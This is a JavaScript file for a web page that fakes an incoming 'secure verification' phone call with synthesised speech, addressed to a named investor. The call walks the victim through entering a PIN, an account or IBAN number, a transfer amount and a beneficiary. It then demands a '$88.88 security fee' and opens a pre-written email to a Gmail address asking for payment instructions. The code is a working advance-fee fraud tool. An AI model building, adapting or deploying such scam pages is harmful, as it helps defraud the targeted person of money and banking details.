document.addEventListener('DOMContentLoaded', function() {
    // Get elements
    const homeScreen = document.querySelector('.home-screen');
    const callingScreen = document.querySelector('.calling-screen');
    const incomingCallScreen = document.querySelector('.incoming-call-screen');
    const activeCallScreen = document.querySelector('.active-call-screen');
    const startCallButton = document.getElementById('start-call');
    const answerCallButton = document.getElementById('answer-call');
    const declineCallButton = document.getElementById('decline-call');
    const endCallButton = document.getElementById('end-call');
    const muteButton = document.getElementById('mute-button');
    const speakerButton = document.getElementById('speaker-button');
    const subtitles = document.getElementById('subtitles');
    const inputStatus = document.getElementById('input-status');
    const ringtone = document.getElementById('ringtone');
    const callAnswerSound = document.getElementById('call-answer-sound');
    const callDeclineSound = document.getElementById('call-decline-sound');
    const callTimer = document.querySelector('.call-timer');
    const swipeHandle = document.getElementById('swipe-handle');
    const progressSteps = [
        document.getElementById('step-1'),
        document.getElementById('step-2'),
        document.getElementById('step-3'),
        document.getElementById('step-4'),
        document.getElementById('step-5')
    ];
    
    // Keypad buttons
    const keys = document.querySelectorAll('.key');
    
    // Call state
    let callActive = false;
    let callDuration = 0;
    let callInterval;
    let currentStep = 0;
    let userInput = "";
    let errorCount = 0;
    let expectedPin = "101029"; // The expected VTL-VOLT PIN
    
    // Verification data (in a real scenario, this would come from your backend)
    const verificationData = {
        name: "Monica Bulleri",
        pin: expectedPin,
        accountNumber: "null",
        transferAmount: "$11000",
        beneficiary: "Monica Belluri",
        fee: "$88.88"
    };
    
    // Switch screens
    function showScreen(screen) {
        document.querySelectorAll('.screen > div').forEach(div => {
            div.classList.remove('active');
        });
        screen.classList.add('active');
    }
    
    // Start call
    startCallButton.addEventListener('click', function() {
        showScreen(callingScreen);
        
        // Play ringtone on speaker immediately
        ringtone.play().catch(e => console.log("Audio play failed:", e));
        
        // Simulate calling delay
        setTimeout(() => {
            showScreen(incomingCallScreen);
        }, 2000);
    });
    
    // Answer call
    function answerCall() {
        showScreen(activeCallScreen);
        ringtone.pause();
        ringtone.currentTime = 0;
        
        // Play answer sound
        callAnswerSound.play();
        
        callActive = true;
        currentStep = 0;
        
        // Start call timer
        startCallTimer();
        
        // Begin verification process
        setTimeout(() => {
            startVerificationProcess();
        }, 1000);
    }
    
    // Decline call
    function declineCall() {
        showScreen(homeScreen);
        ringtone.pause();
        ringtone.currentTime = 0;
        
        // Play decline sound
        callDeclineSound.play();
    }
    
    // Swipe handling
    let startY = 0;
    let currentY = 0;
    
    swipeHandle.addEventListener('touchstart', function(e) {
        startY = e.touches[0].clientY;
    });
    
    swipeHandle.addEventListener('touchmove', function(e) {
        currentY = e.touches[0].clientY;
        const diff = currentY - startY;
        
        // Limit movement
        if (diff > -100 && diff < 100) {
            this.style.transform = `translateY(${diff}px)`;
        }
    });
    
    swipeHandle.addEventListener('touchend', function() {
        const diff = currentY - startY;
        
        if (diff < -50) {
            // Swipe up - answer call
            answerCall();
        } else if (diff > 50) {
            // Swipe down - decline call
            declineCall();
        }
        
        // Reset position
        this.style.transform = 'translateY(0)';
    });
    
    // Button answer call
    answerCallButton.addEventListener('click', answerCall);
    
    // Button decline call
    declineCallButton.addEventListener('click', declineCall);
    
    // End call
    endCallButton.addEventListener('click', function() {
        showScreen(homeScreen);
        callActive = false;
        clearInterval(callInterval);
        callDuration = 0;
        resetVerificationProcess();
    });
    
    // Keypad input
    keys.forEach(key => {
        key.addEventListener('click', function() {
            if (!callActive) return;
            
            const digit = this.textContent;
            
            // Visual feedback
            this.style.transform = 'translateY(2px)';
            this.style.boxShadow = '0 2px 4px rgba(0, 0, 0, 0.1)';
            setTimeout(() => {
                this.style.transform = '';
                this.style.boxShadow = '';
            }, 100);
            
            // Handle input
            handleKeyPress(digit);
        });
    });
    
    // Handle key press based on current verification step
    function handleKeyPress(digit) {
        // Handle special keys
        if (digit === '#') {
            // Submit input
            processUserInput();
            userInput = ""; // Reset input
            return;
        } else if (digit === '*') {
            // Clear input
            userInput = "";
            updateInputStatus();
            return;
        }
        
        // Add digit to input
        userInput += digit;
        updateInputStatus();
    }
    
    // Update input status display
    function updateInputStatus() {
        // Show asterisks for PIN entry, actual digits for other inputs
        if (currentStep === 1) { // PIN step
            inputStatus.textContent = '*'.repeat(userInput.length);
        } else {
            inputStatus.textContent = userInput;
        }
    }
    
    // Process user input based on current step
    function processUserInput() {
        switch(currentStep) {
            case 0: // Name verification
                if (userInput === "1") { // Assuming 1 means "Yes"
                    speak("Thank you. Please enter your VTL-VOLT PIN followed by the pound key.");
                    progressSteps[0].classList.add('completed');
                    progressSteps[1].classList.add('active');
                    currentStep = 1;
                    errorCount = 0;
                } else {
                    errorCount++;
                    if (errorCount >= 2) {
                        speak("Too many incorrect attempts. Verification failed. Goodbye.");
                        setTimeout(() => endCallButton.click(), 3000);
                    } else {
                        speak("I'm sorry, I didn't understand that. Please press 1 for yes or 2 for no.");
                    }
                }
                break;
                
            case 1: // PIN verification
                if (userInput === verificationData.pin) {
                    speak("PIN verified successfully. Please enter your account number/Iban number followed by the pound key.");
                    progressSteps[1].classList.add('completed');
                    progressSteps[2].classList.add('active');
                    currentStep = 2;
                    errorCount = 0;
                } else {
                    errorCount++;
                    if (errorCount >= 2) {
                        speak("Too many incorrect PIN attempts. Verification failed. Goodbye.");
                        setTimeout(() => endCallButton.click(), 3000);
                    } else {
                        speak("Invalid PIN. Please try entering your VTL-VOLT PIN again followed by the pound key.");
                    }
                }
                break;
                
            case 2: // account number verification
                if (userInput === verificationData.accountNumber) {
                    speak("account number/Iban number verified. Please enter the transfer amount followed by the pound key.");
                    progressSteps[2].classList.add('completed');
                    progressSteps[3].classList.add('active');
                    currentStep = 3;
                    errorCount = 0;
                } else {
                    errorCount++;
                    if (errorCount >= 2) {
                        speak("Too many incorrect account number attempts. Verification failed. Goodbye.");
                        setTimeout(() => endCallButton.click(), 3000);
                    } else {
                        speak("account number does not match. Please try entering your account number again followed by the pound key.");
                    }
                }
                break;
                
            case 3: // Transfer amount verification
                // Convert amount to digits only for comparison (remove $ and ,)
                const amountDigits = verificationData.transferAmount.replace(/[$,]/g, '');
                if (userInput === amountDigits) {
                    speak("Transfer amount verified. Please enter the beneficiary name. Press 1 for Monica Belluri, press 2 for Sarah Johnson.");
                    progressSteps[3].classList.add('completed');
                    progressSteps[4].classList.add('active');
                    currentStep = 4;
                    errorCount = 0;
                } else {
                    errorCount++;
                    if (errorCount >= 2) {
                        speak("Too many incorrect amount attempts. Verification failed. Goodbye.");
                        setTimeout(() => endCallButton.click(), 3000);
                    } else {
                        speak("Transfer amount does not match. Please try entering the amount again followed by the pound key.");
                    }
                }
                break;
                
            case 4: // Beneficiary verification
                if (userInput === "1") {
                    speak("Beneficiary verified. Your transfer requires a security fee of $88.88 to complete the procedure. Press 1 to confirm and proceed with payment, press 2 to cancel.");
                    progressSteps[4].classList.add('completed');
                    currentStep = 5;
                    errorCount = 0;
                } else if (userInput === "2") {
                    errorCount++;
                    if (errorCount >= 2) {
                        speak("Too many incorrect beneficiary attempts. Verification failed. Goodbye.");
                        setTimeout(() => endCallButton.click(), 3000);
                    } else {
                        speak("Beneficiary does not match our records. Please try again. Press 1 for ROBERT FITZWELL, press 2 for Sarah Johnson.");
                    }
                } else {
                    errorCount++;
                    if (errorCount >= 2) {
                        speak("Too many incorrect inputs. Verification failed. Goodbye.");
                        setTimeout(() => endCallButton.click(), 3000);
                    } else {
                        speak("Invalid selection. Please press 1 for Monica Belluri, press 2 for Sarah Johnson.");
                    }
                }
                break;
                
            case 5: // Final confirmation
                if (userInput === "1") {
                    speak("Thank you for confirming. Your transfer is now being processed with the security fee. You will receive a confirmation shortly. Thank you for using our secure verification system.");
                    currentStep = 7; // Completed
                    
                    // End call after completion
                    setTimeout(() => {
                        endCallButton.click();
                    }, 5000);
                } else if (userInput === "2") {
                    speak("Transfer cancelled. No security fee will be charged. Thank you for using our verification system.");
                    currentStep = 8; // Cancelled
                    
                    // End call after cancellation
                    setTimeout(() => {
                        endCallButton.click();
                    }, 3000);
                } else if (userInput === "#") {
                    // Wait for speech to complete before redirecting
                    const checkSpeech = setInterval(() => {
                        if (!window.speechSynthesis.speaking) {
                            clearInterval(checkSpeech);
                            redirectToEmail();
                        }
                    }, 100);
                }
                break;
        }
    }
    
    // Redirect to email function
    function redirectToEmail() {
        const subject = "FET Transfer Payment Request";
        const body = "Dear FET Transfer Service Team,\n\nI would like to proceed with the payment of $88.88 security fee for my recent transfer.\n\nPlease provide me with the payment instructions.\n\nThank you.";
        window.location.href = `mailto:fet.transferservice.vvip@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
    }
    
    // Start the verification process
    function startVerificationProcess() {
        // Play the full verification message
        speak("Hello, Investor Monica Bulleri. For your security, we will now complete verification of your recent transfer. Please confirm your identity. Press 1 for yes, press 2 for no.");
        
        // Show first question
        progressSteps[0].classList.add('active');
    }
    
    // Reset verification process
    function resetVerificationProcess() {
        currentStep = 0;
        userInput = "";
        errorCount = 0;
        inputStatus.textContent = "Please wait...";
        
        // Reset progress indicators
        progressSteps.forEach(step => {
            step.classList.remove('active', 'completed');
        });
    }
    
    // Text-to-Speech function
    function speak(text) {
        subtitles.textContent = text;
        
        if ('speechSynthesis' in window) {
            const speech = new SpeechSynthesisUtterance();
            speech.text = text;
            speech.volume = 1;
            speech.rate = 0.9;
            speech.pitch = 1;
            
            // Cancel any previous speech
            window.speechSynthesis.cancel();
            
            // Speak the text
            window.speechSynthesis.speak(speech);
            
            // Handle the # key redirect after speech is done
            if (text.includes("security fee of $88.88")) {
                speech.onend = function() {
                    // Add event listener for # key
                    const hashKeyHandler = function(e) {
                        if (e.target.textContent === "#") {
                            redirectToEmail();
                            // Remove the event listener after use
                            document.removeEventListener('click', hashKeyHandler);
                        }
                    };
                    
                    // Add event listener to all keys
                    keys.forEach(key => {
                        key.addEventListener('click', hashKeyHandler);
                    });
                };
            }
        }
    }
    
    // Call timer
    function startCallTimer() {
        callInterval = setInterval(() => {
            callDuration++;
            const minutes = Math.floor(callDuration / 60).toString().padStart(2, '0');
            const seconds = (callDuration % 60).toString().padStart(2, '0');
            callTimer.textContent = `${minutes}:${seconds}`;
        }, 1000);
    }
    
    // Mute button (simulated)
    muteButton.addEventListener('click', function() {
        this.classList.toggle('active');
        if (this.classList.contains('active')) {
            this.textContent = "Unmute";
        } else {
            this.textContent = "Mute";
        }
    });
    
    // Speaker button (simulated)
    speakerButton.addEventListener('click', function() {
        this.classList.toggle('active');
        if (this.classList.contains('active')) {
            this.textContent = "Speaker On";
        } else {
            this.textContent = "Speaker Off";
        }
    });
});
